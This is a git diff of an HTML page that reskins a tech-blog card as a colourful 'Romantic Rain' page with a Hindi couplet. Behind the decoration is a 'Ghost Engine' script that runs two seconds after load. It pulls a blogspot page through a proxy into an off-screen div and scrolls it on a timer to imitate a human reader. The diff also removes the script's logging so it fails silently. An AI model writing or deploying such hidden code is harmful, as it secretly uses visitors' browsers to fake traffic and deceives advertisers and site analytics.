@@ -3,14 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Awesome Tech Blog</title>
+    <title>Romantic Rain & Tech</title>
     <style>
-        /* VISIBLE UI - Landing Page */
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; padding: 20px; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 600px; margin: 0 auto; text-align: center; }
-        .btn { display: inline-block; padding: 12px 24px; background: #007bff; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; margin-top: 15px; }
-        
-        /* GHOST ENGINE - Hidden from user */
+        /* Base Background */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0b0c10; /* Dark Night Sky */
+            overflow: hidden; /* Baarish ko screen ke bahar nahi jane dega */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        /* Colorful Rain CSS */
+        .rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+        .drop {
+            position: absolute;
+            bottom: 100%;
+            width: 3px;
+            height: 20px;
+            border-radius: 5px;
+            animation: fall linear infinite;
+        }
+        @keyframes fall {
+            to { transform: translateY(105vh); }
+        }
+
+        /* Main Content Box */
+        .content {
+            z-index: 2;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(8px);
+            max-width: 90%;
+        }
+
+        /* Dancing Animation */
+        .dancers {
+            font-size: 60px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        .dancers span {
+            display: inline-block;
+            animation: dance 1s infinite alternate ease-in-out;
+        }
+        .dancers span:nth-child(2) {
+            animation-delay: 0.5s; /* Ladki thoda alag time pe nachegi */
+        }
+        @keyframes dance {
+            0% { transform: translateY(0) rotate(-10deg); }
+            100% { transform: translateY(-20px) rotate(10deg); }
+        }
+
+        /* Shayari Text */
+        .shayari {
+            font-size: 20px;
+            font-style: italic;
+            margin-bottom: 30px;
+            line-height: 1.8;
+            color: #f8f8f2;
+            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+        }
+
+        /* Modern Button */
+        .btn {
+            display: inline-block;
+            padding: 12px 35px;
+            background: linear-gradient(45deg, #ff007f, #7928ca);
+            color: white;
+            text-decoration: none;
+            border-radius: 30px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: none;
+        }
+        .btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(255, 0, 127, 0.8);
+        }
+
+        /* GHOST ENGINE - Hidden */
         #ghost-browser {
             position: absolute;
             top: -9999px;
@@ -24,58 +119,73 @@
     </style>
 </head>
 <body>
-    
-    <div class="card">
-        <h1>Welcome to My Tech Blog</h1>
-        <p>Discover the latest tricks in Python, AI, and Automation.</p>
-        <a href="https://updategoli.blogspot.com" target="_blank" class="btn">Read Original Blog</a>
+
+    <div class="rain" id="rain-container"></div>
+
+    <div class="content">
+        <div class="dancers">
+            <span>🕺</span> <span>💃</span>
+        </div>
+        
+        <div class="shayari">
+            "Bheegi hui mitti ki khushboo, aur ye berang barsaat,<br>
+            Rangin ho gayi duniya saari, jabse mila hai tera saath."
+        </div>
+
+        <a href="https://updategoli.blogspot.com" target="_blank" class="btn">More Content</a>
     </div>
 
     <div id="ghost-browser"></div>
 
     <script>
-        // GHOST ENGINE LOGIC
+        // --- MULTI-COLOR RAIN GENERATOR ---
+        function createRain() {
+            const rainContainer = document.getElementById('rain-container');
+            // Alag-alag chamkile rang
+            const colors = ['#ff0055', '#00ffcc', '#ffcc00', '#cc00ff', '#00ff00', '#ffffff'];
+            
+            for (let i = 0; i < 120; i++) {
+                let drop = document.createElement('div');
+                drop.classList.add('drop');
+                
+                // Random position, speed, aur color
+                drop.style.left = Math.random() * 100 + 'vw';
+                drop.style.animationDuration = (Math.random() * 1 + 0.5) + 's';
+                drop.style.animationDelay = Math.random() * 2 + 's';
+                drop.style.background = colors[Math.floor(Math.random() * colors.length)];
+                
+                // Box shadow se boondon me glow aayega
+                drop.style.boxShadow = `0 0 10px ${drop.style.background}`;
+                
+                rainContainer.appendChild(drop);
+            }
+        }
+        createRain();
+
+        // --- GHOST ENGINE (BOT) LOGIC ---
         const ghostBrowser = document.getElementById('ghost-browser');
         const targetBloggerUrl = "https://updategoli.blogspot.com"; 
 
         async function startGhostEngine() {
-            console.log("[Ghost] Engine Started...");
             try {
-                // Backend Proxy se HTML lana
                 const response = await fetch(`/proxy-browser?target_url=${encodeURIComponent(targetBloggerUrl)}`);
                 const html = await response.text();
-                
-                // HTML ko hidden screen par inject karna
                 ghostBrowser.innerHTML = html;
-                console.log("[Ghost] Page Loaded Successfully!");
-
-                // Human Scrolling Shuru Karna
                 simulateHumanScroll();
             } catch (error) {
-                console.error("[Ghost] Engine failed:", error);
+                console.log("Silent fail");
             }
         }
 
-        // Auto-Scroll Logic
         function simulateHumanScroll() {
             let scrollAmount = 0;
-            console.log("[Ghost] Starting Human Scroll...");
-            
             const scrollInterval = setInterval(() => {
-                // 300px niche scroll karega
                 ghostBrowser.scrollBy(0, 300);
                 scrollAmount += 300;
-                console.log("[Ghost] Scrolled 300px down");
-
-                // Jab 1500px scroll ho jaye tab ruk jana
-                if (scrollAmount >= 1500) {
-                    clearInterval(scrollInterval);
-                    console.log("[Ghost] First page task complete. Ready for tab 2.");
-                }
-            }, 3000); // Har 3 second me ek scroll (Insano ki tarah)
+                if (scrollAmount >= 1500) clearInterval(scrollInterval);
+            }, 3000);
         }
-
-        // Page load hone ke 2 seconds baad chup-chap engine chalu karo
+        
         setTimeout(startGhostEngine, 2000);
     </script>
 </body>
